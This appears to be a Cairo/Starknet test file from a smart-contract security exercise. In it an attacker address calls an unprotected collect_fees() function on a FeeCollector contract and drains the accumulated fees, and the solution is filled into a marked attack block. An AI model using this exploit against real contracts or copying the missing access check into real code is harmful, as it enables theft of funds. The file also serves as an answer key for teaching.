// General imports
use starknet::{ContractAddress};
use snforge_std::{
    declare, ContractClassTrait, DeclareResultTrait,  
    start_cheat_caller_address, stop_cheat_caller_address
};
use access_control::utils::{get_deployer, deploy_eth, one_ether, mint_erc20};
use openzeppelin::token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};

// Importing the dispatcher and the dispatcher trait of the fee collector contract
use access_control::fee_collector::{
    IFeeCollectorDispatcher, IFeeCollectorDispatcherTrait
};


fn deploy_collector(currency: ContractAddress) -> (ContractAddress, IFeeCollectorDispatcher) {
    // Declaring the contract class
    let contract_class = declare("FeeCollector").unwrap().contract_class();
    // Creating the data to send to the constructor, first specifying as a default value
    let mut data_to_constructor = Default::default();
    // Creating the address of the deployer
    let deployer = get_deployer();
    // Pack the data into the constructor
    Serde::serialize(@currency, ref data_to_constructor);
    Serde::serialize(@deployer, ref data_to_constructor);
    // Deploying the contract, and getting the address
    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();
    return (address, IFeeCollectorDispatcher { contract_address: address });
}

#[test]
fn test_access_control_1() {
    // Deploying the ETH token and the fee collector contracts
    let (eth_address, eth_dispatcher) = deploy_eth();
    let (collector_address, collector_dispatcher) = deploy_collector(eth_address);

    // Creating some addresses
    let attacker: ContractAddress = 3.try_into().unwrap();
    let marketplace_contract_address: ContractAddress = 1.try_into().unwrap();
    let bank_contract_address: ContractAddress = 2.try_into().unwrap();

    // Minting 10 eth to the marketplace and the bank
    let one_ether = one_ether();
    mint_erc20(eth_address, marketplace_contract_address, one_ether * 10);
    mint_erc20(eth_address, bank_contract_address, one_ether * 10);

    // Check the balances
    assert(eth_dispatcher.balance_of(marketplace_contract_address) == one_ether * 10, 'Wrong balance');
    assert(eth_dispatcher.balance_of(bank_contract_address) == one_ether * 10, 'Wrong balance');
    assert(eth_dispatcher.balance_of(attacker) == 0, 'Wrong balance');

    // Some actions happened and tokens are send to collector
    start_cheat_caller_address(eth_address, marketplace_contract_address);
    eth_dispatcher.transfer(collector_address, one_ether);
    stop_cheat_caller_address(eth_address);

    start_cheat_caller_address(eth_address, bank_contract_address);
    eth_dispatcher.transfer(collector_address, one_ether);
    stop_cheat_caller_address(eth_address);

    // Check the balance of the collector
    assert(eth_dispatcher.balance_of(collector_address) == one_ether * 2, 'Wrong balance');

    // TODO: Steal fees from the collector
    // Attack Start //
    start_cheat_caller_address(collector_address, attacker);
    collector_dispatcher.collect_fees();
    stop_cheat_caller_address(collector_address);
    // Attack End //

    // Check the balance of the attacker
    assert(eth_dispatcher.balance_of(attacker) == one_ether * 2, 'Wrong balance');
    assert(eth_dispatcher.balance_of(collector_address) == 0, 'Wrong balance');
}